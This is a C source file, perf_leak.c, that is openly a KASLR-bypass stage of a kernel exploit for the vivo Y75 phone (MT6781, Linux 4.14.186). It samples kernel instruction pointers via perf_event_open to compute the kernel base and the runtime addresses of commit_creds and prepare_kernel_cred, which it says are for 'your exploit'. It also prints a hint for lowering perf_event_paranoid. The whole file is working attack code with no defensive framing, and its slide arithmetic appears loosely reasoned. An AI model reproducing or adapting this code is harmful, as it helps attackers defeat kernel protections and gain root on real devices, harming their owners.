/*
 * perf_leak.c — KASLR base leak via perf_event_open
 * Target: vivo Y75 (MT6781), Linux 4.14.186
 *
 * Method:
 *   Uses PERF_TYPE_SOFTWARE + PERF_COUNT_SW_CPU_CLOCK with callchain
 *   sampling to capture kernel instruction pointers, then cross-references
 *   them against known ELF symbol offsets to compute the KASLR slide.
 *
 * Requirements:
 *   /proc/sys/kernel/perf_event_paranoid must be <= 1
 *   Check: cat /proc/sys/kernel/perf_event_paranoid
 *   If restricted: try perf_event_open with CAP_SYS_ADMIN or from root
 *
 * Build:
 *   aarch64-linux-android-gcc -O2 -o perf_leak perf_leak.c -static
 *
 * Usage:
 *   ./perf_leak
 *   Output: KASLR base address to use in exploit
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>

/* ── Known symbol offsets from vmlinux_new.elf (Ghidra-confirmed) ─────── */
/* These are offsets from KIMAGE_TEXT_BASE (compile-time base)             */
#define COMMIT_CREDS_OFF            0x00000000000e6170ULL
#define PREPARE_KERNEL_CRED_OFF     0x00000000000e6508ULL

/* Compile-time kernel text base from ELF */
#define KIMAGE_TEXT_BASE_STATIC     0xffffff8008000000ULL

/* Known compiled-in symbol addresses (static, pre-KASLR) */
/* Add more from your vmlinux_new.elf symbol table for better accuracy     */
#define SYM_COMMIT_CREDS_STATIC     (KIMAGE_TEXT_BASE_STATIC + COMMIT_CREDS_OFF)
#define SYM_PREPARE_KCRED_STATIC    (KIMAGE_TEXT_BASE_STATIC + PREPARE_KERNEL_CRED_OFF)

/* ── Perf ring buffer ────────────────────────────────────────────────────*/
#define MMAP_PAGES                  32
#define MMAP_SIZE                   ((MMAP_PAGES + 1) * 4096)
#define SAMPLE_PERIOD               100000
#define MAX_CALLCHAIN_DEPTH         32
#define MAX_SAMPLES                 512
#define KERNEL_ADDR_MIN             0xff00000000000000ULL

/* ── Syscall wrapper ─────────────────────────────────────────────────────*/
static long perf_event_open(struct perf_event_attr *attr,
                             pid_t pid, int cpu,
                             int group_fd, unsigned long flags)
{
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

/* ── Kernel address validation ───────────────────────────────────────────*/
static int is_kernel_addr(uint64_t addr)
{
    return (addr >= KERNEL_ADDR_MIN);
}

/* ── Compute KASLR slide from a leaked kernel address ────────────────────
 * We align the leaked address to 2MB (kernel KASLR granularity on ARM64)
 * and subtract the known static symbol offset to get the slide.           */
static uint64_t compute_kaslr_base(uint64_t leaked_kaddr)
{
    /* KASLR on ARM64 4.14 randomizes at 2MB granularity */
    uint64_t align = 0x200000ULL;

    /* Try matching against commit_creds offset */
    uint64_t candidate = (leaked_kaddr & ~(align - 1)) - COMMIT_CREDS_OFF;
    candidate &= ~(align - 1);

    /* Sanity check: base must be in kernel range and 2MB aligned */
    if (is_kernel_addr(candidate) && (candidate & (align - 1)) == 0)
        return candidate;

    return 0;
}

int main(void)
{
    struct perf_event_attr attr;
    int fd;
    void *mmap_buf;
    struct perf_event_mmap_page *pc;
    uint64_t leaked_addrs[MAX_SAMPLES];
    int leaked_count = 0;
    uint64_t kaslr_base = 0;

    printf("[*] perf_leak.c — KASLR base leak for vivo Y75 (MT6781)\n");
    printf("[*] Kernel: Linux 4.14.186 | Arch: ARM64 | VA_BITS: 39\n\n");

    /* Check paranoid level */
    {
        FILE *f = fopen("/proc/sys/kernel/perf_event_paranoid", "r");
        int paranoid = 3;
        if (f) {
            fscanf(f, "%d", &paranoid);
            fclose(f);
        }
        printf("[*] perf_event_paranoid = %d\n", paranoid);
        if (paranoid > 1) {
            printf("[-] WARNING: paranoid > 1, kernel sampling may be restricted\n");
            printf("[-] Try: echo -1 > /proc/sys/kernel/perf_event_paranoid\n");
            printf("[-] Attempting anyway...\n\n");
        } else {
            printf("[+] perf_event_paranoid OK\n\n");
        }
    }

    /* Configure perf event */
    memset(&attr, 0, sizeof(attr));
    attr.type           = PERF_TYPE_SOFTWARE;
    attr.config         = PERF_COUNT_SW_CPU_CLOCK;
    attr.size           = sizeof(attr);
    attr.sample_period  = SAMPLE_PERIOD;
    attr.sample_type    = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    attr.exclude_user   = 1;   /* kernel addresses only */
    attr.exclude_hv     = 1;
    attr.exclude_idle   = 0;
    attr.disabled       = 1;
    attr.wakeup_events  = 1;

    fd = perf_event_open(&attr, 0, -1, -1, 0);
    if (fd < 0) {
        perror("[-] perf_event_open failed");
        printf("[-] errno = %d\n", errno);
        return 1;
    }
    printf("[+] perf_event_open fd = %d\n", fd);

    /* mmap ring buffer */
    mmap_buf = mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE,
                    MAP_SHARED, fd, 0);
    if (mmap_buf == MAP_FAILED) {
        perror("[-] mmap failed");
        close(fd);
        return 1;
    }

    pc = (struct perf_event_mmap_page *)mmap_buf;
    printf("[+] Ring buffer mapped at %p\n", mmap_buf);

    /* Enable sampling */
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    printf("[*] Sampling kernel addresses (2 seconds)...\n");
    for(volatile int i=0;i<50000000;i++){syscall(172);}

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    /* Parse ring buffer */
    {
        uint64_t head = pc->data_head;
        uint64_t tail = pc->data_tail;
        uint8_t  *data = (uint8_t *)mmap_buf + 4096;

        __sync_synchronize();

        while (tail < head && leaked_count < MAX_SAMPLES) {
            struct perf_event_header *hdr =
                (struct perf_event_header *)(data + (tail & (MMAP_PAGES * 4096 - 1)));

            if (hdr->type == PERF_RECORD_SAMPLE) {
                uint8_t *p = (uint8_t *)(hdr + 1);

                /* PERF_SAMPLE_IP */
                uint64_t ip = *(uint64_t *)p;
                p += 8;

                if (is_kernel_addr(ip)) {
                    leaked_addrs[leaked_count++] = ip;
                }

                /* PERF_SAMPLE_CALLCHAIN */
                uint64_t nr = *(uint64_t *)p;
                p += 8;
                for (uint64_t i = 0; i < nr && i < MAX_CALLCHAIN_DEPTH; i++) {
                    uint64_t chain_ip = *(uint64_t *)p;
                    p += 8;
                    if (is_kernel_addr(chain_ip) && leaked_count < MAX_SAMPLES) {
                        leaked_addrs[leaked_count++] = chain_ip;
                    }
                }
            }
            tail += hdr->size;
        }

        pc->data_tail = tail;
    }

    printf("[+] Collected %d kernel addresses\n\n", leaked_count);

    if (leaked_count == 0) {
        printf("[-] No kernel addresses leaked.\n");
        printf("[-] Check perf_event_paranoid and try again.\n");
        goto cleanup;
    }

    /* Print first 10 leaked addresses for verification */
    printf("[*] Sample leaked kernel addresses:\n");
    for (int i = 0; i < leaked_count && i < 10; i++) {
        printf("    [%02d] 0x%016llx\n", i, (unsigned long long)leaked_addrs[i]);
    }
    printf("\n");

    /* Attempt KASLR base computation from each leaked address */
    for (int i = 0; i < leaked_count; i++) {
        uint64_t candidate = compute_kaslr_base(leaked_addrs[i]);
        if (candidate != 0) {
            kaslr_base = candidate;
            printf("[+] KASLR base candidate from addr[%d]: 0x%016llx\n",
                   i, (unsigned long long)kaslr_base);
            break;
        }
    }

    if (kaslr_base == 0) {
        printf("[-] Could not compute KASLR base automatically.\n");
        printf("[-] Use leaked addresses above and cross-reference with\n");
        printf("[-] vmlinux_new.elf symbols manually.\n");
        printf("[-] Formula: kaslr_base = leaked_addr - symbol_offset_in_elf\n");
        goto cleanup;
    }

    /* Print final resolved addresses */
    printf("\n[+] ═══════════════════════════════════════════════\n");
    printf("[+]  KASLR base (runtime KIMAGE_TEXT_BASE):\n");
    printf("[+]  0x%016llx\n", (unsigned long long)kaslr_base);
    printf("[+] ═══════════════════════════════════════════════\n\n");

    printf("[+] Runtime symbol addresses:\n");
    printf("    commit_creds        = 0x%016llx\n",
           (unsigned long long)(kaslr_base + COMMIT_CREDS_OFF));
    printf("    prepare_kernel_cred = 0x%016llx\n",
           (unsigned long long)(kaslr_base + PREPARE_KERNEL_CRED_OFF));

    printf("\n[*] Use these in your exploit or pass kaslr_base to target.h\n");

cleanup:
    munmap(mmap_buf, MMAP_SIZE);
    close(fd);
    return (kaslr_base != 0) ? 0 : 1;
}
